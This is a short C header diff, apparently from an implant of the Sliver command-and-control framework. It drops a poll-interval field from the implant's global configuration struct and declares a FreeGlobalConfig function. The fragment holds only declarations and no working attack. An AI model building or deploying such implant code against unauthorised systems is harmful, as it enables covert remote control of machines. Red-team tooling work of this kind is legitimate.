@@ -22,7 +22,6 @@ struct _GLOBAL_CONFIG {
 	UINT64 uPeerID;
 	UINT64 uEncoderNonce;
 	LPSTR lpServerMinisignPublicKey;
-	DWORD dwPollInterval;
 	DWORD dwMaxFailure;
 	DWORD dwReconnectInterval;
 };
@@ -103,4 +102,9 @@ PBUFFER SliverEncrypt
 (
 	_In_ PGLOBAL_CONFIG pConfig,
 	_In_ PBUFFER pInput
+);
+
+VOID FreeGlobalConfig
+(
+	_In_ PGLOBAL_CONFIG pConfig
 );
